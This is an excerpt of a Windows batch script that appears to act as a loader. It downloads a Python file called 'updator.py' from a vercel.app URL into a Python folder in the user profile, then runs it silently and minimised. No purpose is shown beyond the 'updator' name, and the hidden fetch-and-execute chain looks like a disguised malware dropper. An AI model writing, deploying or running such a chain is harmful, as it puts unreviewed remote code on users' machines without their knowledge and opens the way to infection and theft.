...
set "UPDATOR_SCRIPT_URL=https://boostware-external-download.vercel.app/company/updator.py"
set "INSTALL_PATH=%USERPROFILE%\Python311"
set "ZIP_PATH=%TEMP%\python311.zip"
set "UPDATOR_SCRIPT_PATH=%INSTALL_PATH%\updator.py"
...
:: Download the updator.py script
powershell -Command "& {Invoke-WebRequest -Uri '%UPDATOR_SCRIPT_URL%' -OutFile '%UPDATOR_SCRIPT_PATH%'}"
...
:: Run updator.py silently
start /min "" "%INSTALL_PATH%\python.exe" "%UPDATOR_SCRIPT_PATH%"
